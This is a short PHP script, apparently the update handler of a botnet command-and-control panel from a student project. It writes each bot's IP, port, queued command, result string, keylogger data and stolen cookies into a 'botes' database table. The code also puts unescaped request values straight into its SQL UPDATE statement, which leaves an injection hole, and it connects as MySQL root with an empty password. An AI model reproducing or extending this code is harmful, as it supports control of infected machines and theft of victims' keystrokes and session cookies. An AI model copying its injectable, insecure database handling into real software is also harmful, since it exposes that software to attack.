<?php
if (isset($_REQUEST['butUpdate'])) {
    $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
    mysqli_select_db($link, "pbl4");
    // Lấy ID để có thể thay đổi IP
    $ID = $_REQUEST["IDBot"];
    $ip = $_REQUEST["ipBot"];
    $port = $_REQUEST["portBot"];
    $cmd = $_REQUEST["cmdBot"];
    $retstr = $_REQUEST["retstrBot"];
    $keylogger = $_REQUEST["keyloggerBot"];
    $cookies = $_REQUEST["cookiesBot"];
    $sql = "UPDATE botes SET ip='$ip', port='$port', cmd='$cmd', retstr='$retstr', keylogger='$keylogger', cookies='$cookies' WHERE ID='$ID'";
    mysqli_query($link, $sql);
    mysqli_close($link);
    header("Location: ../php/index.php");
}
